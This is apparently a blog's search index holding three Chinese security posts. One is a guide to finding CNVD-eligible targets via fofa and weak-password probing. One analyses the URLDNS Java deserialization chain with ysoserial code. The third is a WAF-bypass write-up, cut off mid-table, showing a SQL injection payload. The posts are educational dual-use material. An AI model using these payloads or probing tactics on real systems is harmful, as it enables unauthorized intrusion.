<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CNVD原创证书获取姿势</title>
      <link href="/2023/04/30/CNVD%E5%8E%9F%E5%88%9B%E8%AF%81%E4%B9%A6%E8%8E%B7%E5%8F%96%E5%A7%BF%E5%8A%BF/"/>
      <url>/2023/04/30/CNVD%E5%8E%9F%E5%88%9B%E8%AF%81%E4%B9%A6%E8%8E%B7%E5%8F%96%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>挖CNVD证书是在准备出去实习的时候，想着挖个CNVD证书丰富一下自己的简历，再到后来挖CNVD证书完全是因为众测实在是太卷了，出洞率低，重洞率高，导致自己经常挖完众测之后就emo，然后去挖CNVD找一些存在感。很多师傅感觉挖CNVD证书很难，要挖掘0day出来。确实，要挖0day，听起来确实是挺困难的，但是挖CNVD证书不像是众测有限定的资产，互联网上存在的系统数不胜数，我们只需要利用一些小技巧，找到满足发放证书的系统，然后在这里面去寻找相对薄弱的系统来进行挖掘，这样相对来说挖掘到证书的概率还是相对来说大上不少的。到写文章为止，除去还有几份未审核完的报告，我自己是存在4张CNVD证书的。在证书挖掘过程中，自己并未太刻意深入的去挖掘，非要说刻意去干的一件事还是在寻找CNVD证书发放条件的资产上。以下就总结一下自己挖掘CNVD证书的小技巧，希望对师傅们以后挖掘CNVD证书有所帮助。</p><h1 id="0x02-概览"><a href="#0x02-概览" class="headerlink" title="0x02 概览"></a>0x02 概览</h1><p>大致画了个思维导图（感觉不清楚的，可以加我微信，我发原图给师傅）<br><img src="/images/pasted-5.png" alt="upload successful"></p><h1 id="0x03-证书获取条件"><a href="#0x03-证书获取条件" class="headerlink" title="0x03 证书获取条件"></a>0x03 证书获取条件</h1><p>条件一：通用漏洞（网上没有记录—0day）</p><p>条件二：公司注册资金超过5000万</p><p>条件三：所提交漏洞获得中危及中危以上评分</p><p>条件四：互联网可复现案例需要三例（建议多放几例，防止审核过程中存在案例失效，我一般放10）</p><p>or</p><p>事件型漏洞必须是三大运营商（移动、联通、电信）的中高危漏洞，或者党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞才会颁发原创漏洞证书</p><h1 id="0x04-白盒挖掘"><a href="#0x04-白盒挖掘" class="headerlink" title="0x04 白盒挖掘"></a>0x04 白盒挖掘</h1><p>自己最初挖CNVD的时候是采用白盒的方式来挖取的，什么是白盒，就是找一些开源的系统，直接去审计代码，但是慢慢我在尝试挖掘的过程中发现一件尴尬的事。遇到小型的系统（厂商），挖掘出来漏洞，但是不满足证书发放的条件。遇到中型的系统（厂商），会碰到一些扯皮的厂商，说是开源项目，不在管辖范围中之内（翻译一下就是你们用的我开源的产品，没收你们钱，出了问题是你们自己的事）</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p>哎，格局呢。遇到大型的系统（厂商），其对代码审计的能力要求比较高，所以比较难审计出洞，所以慢慢的后面我就改变思路改为黑盒挖去了。那为什么还要写白盒挖取这个，是因为有一些代码审计能力比较强的师傅，可以考虑一下这种挖掘方式，毕竟白盒的挖掘方式比黑盒更容易出洞。</p><h1 id="0x05-黑盒挖掘"><a href="#0x05-黑盒挖掘" class="headerlink" title="0x05 黑盒挖掘"></a>0x05 黑盒挖掘</h1><p>主要还是写写黑盒挖掘，自己的证书也全是黑盒挖掘过来的。那在挖掘CNVD证书的过程中，我认为最重要的一部分还是在选择挖掘目标上面。那怎么样去寻找满足发放证书条件的目标呢，以下有三个方法。</p><p>① 利用空间测绘寻找</p><p>② 利用脚本寻找</p><p>③ 在CNVD官网寻找</p><p>首先来讲讲第一个方法：利用空间测绘，这里以fofa为例</p><p>我们可以搜索一些常见的系统可能使用的名称，比如说”管理系统”、”登录系统”、”某某平台”等等</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p>还可以利用组合语法如一些常见登录系统会使用到的一些js文件，css文件等去进行寻找,比如</p><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>然后找到这些系统之后，看看归属于哪个公司，判断其归属于哪个公司，最好用的方法就是，在这种技术支持上去看是属于哪个公司</p><p><img src="/images/pasted-13.png" alt="upload successful"></p><p>当然也有一些系统是没有这种技术支持的，这个时候我们就需要一些其他的方法去判断其归属于哪个公司，有源代码中有注释的，有进后台发现某某公司开发的，反正找归属是个细心活，没有太多的技巧。找到归属于哪一个公司之后的话，我们就可以利用爱企查等查企业信息等网址对该公司做一个查询，看看其注册资产</p><p><img src="/images/pasted-15.png" alt="upload successful"></p><p>注册资产超过5000万，这套系统就满足发放证书的基本条件了，我们就可以进行一个挖掘，假如没超过5000万，我们就不用进行挖掘了，因为即使是挖到了洞，也不满足发放证书的条件。本人自己在最初挖掘CNVD证书的时候就是利用空间测绘这种方法，找满足条件的系统，然后进行挖掘。自己第一次挖掘CNVD的时候也是利用这种方法，也是有幸挖掘到一个Elastic的一个0day，然后申请了如下证书。</p><p><img src="/images/pasted-17.png" alt="upload successful"></p><p>这种寻找目标的劣势也很明显，第一就是寻找系统不够精准（需要手动去确定目标是否满足发放证书条件），第二就是需要我们去确定该套系统属于哪一个厂商。就如上两个问题就会浪费大量的时间，导致效率非常的低，所以不是很推荐这种寻找目标的方法。</p><p>第二个方法：利用脚本寻找</p><p>具体脚本如下文</p><p>快速获得CNVD证书的小技巧</p><p>作者：OceanSec<br>文章来源于<a href="https://oceansec.blog.csdn.net/">https://oceansec.blog.csdn.net/</a><br>这个脚本我自己没有使用过，不过其导出5000万漏洞资产，然后再结合一些工具半自动化测试确实适合快速去刷洞。</p><p>第三个方法：在CNVD官网寻找</p><p>这也是我自己使用最多的一个方法，怎么利用CNVD官网去寻找目标呢，首先来到CNVD官网。</p><p>在漏洞列表处，可以看到以往发生的安全漏洞，然后我自己比较喜欢寻找WEB应用的系统，所以我会选择一个WEB应用分类，当然师傅们也可以更具自己擅长挖掘的东西来进行选择。</p><p><img src="/images/pasted-19.png" alt="upload successful"></p><p>可以看到其会报道处某某公司的某某系统存在某某漏洞</p><p><img src="/images/pasted-23.png" alt="upload successful"></p><p>比如这里有个某某公司，那我们就可以利用爱企查去查询一下这个公司的注册资产，如果超过5000万，满足发放证书条件，那我们就可以根据这个提示去试着寻找一下这个系统，找到之后呢，我们可以利用我们平常的测试手段，尽量模仿打一下CNVD官网所通报出来的漏洞，据我打过多个的经验来看，大多数都是能打到的，找到漏洞点进行漏洞复现的。当然测试到了漏洞点，你可以尝试提交一下，不过百分之99的概率是重复的，既然重复为什么还要在这寻找目标呢。</p><p>① 其实这个系统爆出一个漏洞，其实在某种程度上，其系统的安全性就与其他相比来说较低的，那我们就可以对这个系统进行一个详细的测试，细心一点测试的话，你就会收获到一些惊喜。</p><p>② 有些系统我们测试一下弱口令，假如我们测试出来弱口令（web应用系统的弱口令CNVD是不收录的），我们可以进入后台再进行一个深度挖掘。</p><p>③ 假如CNVD爆出的是某某可以getshell的漏洞，我们可以尝试复现，假如复现成功的话，我们可以把源代码打包备份一份出来，进行一个黑盒加白盒的深度测试。</p><p>其上三个方法呢，由前到后提交漏洞重复的概率会依次降低。在发现存在某个漏洞后，我们还可以去寻找该公司的其他系统，看看该公司其他公司是否也存在该种类型的漏洞（因为一个公司不同的系统很有可能是一个开发团队写出来的，一个系统存在问题，那么其开发的另一个系统也很大概率存在该问题），那么怎么寻找该公司的其他问题呢。我们利用爱企查查询一个企业过后，我们可以来到知识产权，然后点击软件著作权信息。</p><p><img src="/images/pasted-25.png" alt="upload successful"></p><p>这里就可以寻找一些该公司开发的其他公司系统信息</p><p><img src="/images/pasted-27.png" alt="upload successful"></p><p>运气好碰到类似的系统的话，就可以开心地把一份报告变成两份报告，拿两份证书。</p><h1 id="0x06-挖掘思路"><a href="#0x06-挖掘思路" class="headerlink" title="0x06 挖掘思路"></a>0x06 挖掘思路</h1><p>掌握了收集资产的方法，接下来需要的就是一定的挖掘技巧，在挖CNVD的过程中也存在一些经常挖到的漏洞种类和一些小小的挖掘技巧。</p><p>① 大型框架导致的漏洞（如log4j2，shiro身份绕过等等）</p><p>大型框架导致的0day，特别是最新爆发的核弹级漏洞log4j2，在平常的测试过程中可以注意一下这种框架漏洞。（log4j2证书鉴赏）</p><p><img src="/images/pasted-28.png" alt="upload successful"></p><p>② 目录扫描、源代码、js文件、修改请求返回状态码探针后台地址挖掘未授权漏洞</p><p>自己在挖掘这些系统的时候，经常可以挖掘都未授权访问漏洞，挖掘未授权的方法，我们可以使用目录扫描，在源代码中、js文件中查看一些后台的url，还可以通过修改请求的状态码如把0改为1，false改为true等让系统跳转后台地址等。</p><p>③ 通过弱口令进入后台挖掘</p><p>前台的功能点功能较少，假如某个系统存在弱口令，我们就可以进入后台，扩大我们的攻击面（挖掘例子如下）</p><p>详细记录一次CNVD原创漏洞证书挖掘过程</p><p>④ 设备弱口令漏洞</p><p>虽然CNVD已经不收录WEB应用的弱口令的通用洞了，但是一些设备的弱口令漏洞其还是正常收录的。当然设备弱口令你挖掘到非常简单，但是你想挖掘到没有重复的那也是相当的卷，所以你想通过挖掘设备弱口令来获取证书的话，你就要去时刻关注这些设备厂商的动态，在其发布新设备的第一时间就去测试该新设备的弱口令，然后用上你最快的手速写好报告，提交报告，然后坐等证书。</p><p>⑤ RCE打包源码进行代码审计</p><p>当你RCE一个系统的时候，你可以把该系统的源代码打包一份出来，然后通过白盒的方式去审核源代码，进一步扩大战果。</p><h1 id="0x07-结尾"><a href="#0x07-结尾" class="headerlink" title="0x07 结尾"></a>0x07 结尾</h1><p>大概挖掘思路就是这些，当然可能还有一些没有想到的没有写上来，以后想起来的单独写写。</p><p><img src="/images/pasted-29.png" alt="upload successful"></p><p>最后祝师傅们证书满满。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS反序列化链分析</title>
      <link href="/2023/04/30/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/04/30/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>URLDNS是Java反序列化上最简单的一条链了，按实际效果来说它并不能被称为一条漏洞利用链，因为它不能执行命令，它的参数是一条URL，最终达到的效果是触发一次DNS请求。但是由于这条链没有依赖任何第三方的库，所以特别适合用来探测是否存在反序列化漏洞。</p><h1 id="HashMap的put方法触发dns请求"><a href="#HashMap的put方法触发dns请求" class="headerlink" title="HashMap的put方法触发dns请求"></a>HashMap的put方法触发dns请求</h1><p>我们先来看看如下这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://oma19i.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后我们看看dnslog平台的请求情况</p><p><img src="/assets/image-20230423173846-krvusbm.png" alt="image.png"></p><p>可以看到dnslog平台接收到dns请求，那么具体哪里触发了dns请求呢，我们可以来调试一下。</p><p><img src="/assets/image-20230423174054-am2wq36.png" alt="image.png"></p><p>跟进put方法</p><p><img src="/assets/image-20230423193315-c9iej0y.png" alt="image.png"></p><p>这里有个putVal方法，它是哈希表结构存储函数并不是我们关注的重点，可以看到putVal里面是调用了hash函数的，这里调用hash函数是HashMap为了保持传入的key唯一，所以需要对key做一个hash处理。那继续跟进hash方法</p><p><img src="/assets/image-20230423193342-ry7mgj8.png" alt="image.png"></p><p>判断key是否为null，不为null则调用key.hashCode，再跟进key.hashCode</p><p><img src="/assets/image-20230423193400-t2826su.png" alt="image.png"></p><p>这里判断hashCode值是否为-1，假如等于-1的就直接返回hashCode，hashCode在如下位置赋值</p><p><img src="/assets/image-20230423193418-uyspkb8.png" alt="image.png"></p><p>所以if语句里的条件不成立，所以继续走到handler.hashCode，这里的handler是URLStreamHandler的一个实例（此处留意一下这个handler）</p><p><img src="/assets/image-20230423193435-xmnlpg7.png" alt="image.png"></p><p>继续跟进handler.hashCode</p><p><img src="/assets/image-20230423193815-m6p9nwj.png" alt="image.png"></p><p>发现会调用getHostAddress这个方法，继续跟进</p><p><img src="/assets/image-20230423194007-gqmzmcp.png" alt="image.png"></p><p>发现调用getByName方法，也就是这个函数发送了dns请求</p><p><img src="/assets/image-20230423194431-aqa3qp4.png" alt="image.png"></p><p>搞明白了为什么会发生dns请求之后呢，再来分析分析URLDNS这条链</p><h1 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h1><p>先看看ysoserial生成的payload代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它new了一个SilentURLStreamHandler</p><p><img src="/assets/image-20230423200918-sluvcrh.png" alt="image.png"></p><p>而SilentURLStreamHandler继承了URLStreamHandler然后重写了如下两个方法</p><p><img src="/assets/image-20230423201020-d8tdik4.png" alt="image.png"></p><p>还记得我们在分析使用put方法是会触发dns请求让留意了一下handler</p><p><img src="/assets/image-20230423205459-izhitm6.png" alt="image.png"></p><p>前面说了handler是URLStreamHandler的一个实例，重写了URLStreamHandler里的openConnection方法和getHostAddress方法目的就是为了防止在生成payload的时候触发了dns请求。</p><p>至此为止，我们所有分析的代码都没有涉及到反序列化，那么利用反序列化去构造这条链呢。上面分析了那么久HashMap的put方法触发dns请求，那么今天的主角毋庸置疑也是HashMap这个类，反序列化会触发readObject方法，那么直接进入到HashMap的readObject方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该方法的最后一行，见到了熟悉的一行代码</p><p><img src="/assets/image-20230423224902-tqq44xw.png" alt="image.png"></p><p>那么这条链不就跑通了吗，最后我们以漏洞利用的方式来重新捋一捋</p><p>首先我们利用ysoserial生成一个URLDNS的payload</p><p><img src="/assets/image-20230423225338-rzgeb9y.png" alt="image.png"></p><p>然后创建一个反序列化入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        unserialize(<span class="string">&quot;dnstest.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassCastException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在HashMap类的readObject方法如下代码处打上一个断点</p><p><img src="/assets/image-20230423225557-dma25kz.png" alt="image.png"></p><p>然后进行调试，程序成功走到我们的断点处</p><p><img src="/assets/image-20230423225749-t3v79t6.png" alt="image.png"></p><p>跟进hash方法</p><p><img src="/assets/image-20230423225906-eb313o1.png" alt="image.png"></p><p>跟进key.hashCode</p><p><img src="/assets/image-20230423225937-t6can6f.png" alt="image.png"></p><p>跟进handler.hashCode</p><p><img src="/assets/image-20230423230025-7rxqf8d.png" alt="image.png"></p><p>跟进getHostAddress</p><p><img src="/assets/image-20230423230146-a347lep.png" alt="image.png"></p><p>成功执行到getByName函数触发dns请求</p><p><img src="/assets/image-20230423230242-vindcag.png" alt="image.png"></p><h1 id="利用链挖掘角度分析URLDNS链"><a href="#利用链挖掘角度分析URLDNS链" class="headerlink" title="利用链挖掘角度分析URLDNS链"></a>利用链挖掘角度分析URLDNS链</h1><p>如上的分析都是我们以一个漏洞分析者去正向的分析这条链子，那么以漏洞挖掘者的身份我们就要倒过来看这条链了，首先我们从getByName这个函数开始，这个函数可以触发dns请求，那么我们看看谁调用了这个函数，我么可以点击这个函数，然后用Ctrl+Alt+H来查看这个函数的调用关系</p><p><img src="/assets/image-20230424110243-jycoilw.png" alt="image.png"></p><p>然后就是逐步去看这些函数，是否能构造反序列化链，构造需要我们要注意三个事情</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、参数可控</span><br><span class="line"><span class="number">2</span>、类可反序列化，继承了序列化接口</span><br><span class="line"><span class="number">3</span>、最终走到反序列化触发的readObject</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230424111832-0ps308e.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站安全狗APACHE版V4.0绕过</title>
      <link href="/2023/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97APACHE%E7%89%88V4-0%E7%BB%95%E8%BF%87/"/>
      <url>/2023/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97APACHE%E7%89%88V4-0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在记忆里上次绕安全狗还是在上次，开开心心把自己之前绕过狗的payload拿出来，发现全部被拦截了，事情一下子就严肃起来了，这就开整。<img src="/assets/image-20220210101102-k2p13gt.png" alt="image.png"></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本次环境如下sqli-lab的sql注入靶场</span><br><span class="line">网站安全狗APACHE版V4.0版本的最高防护等级</span><br></pre></td></tr></table></figure><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>首先先来分析分析以前以前绕过的Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union/*!10440*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p>其中这里的10440数字经过fuzz可以替换的有如下</p><figure class="highlight plaintext"><table><tr><td 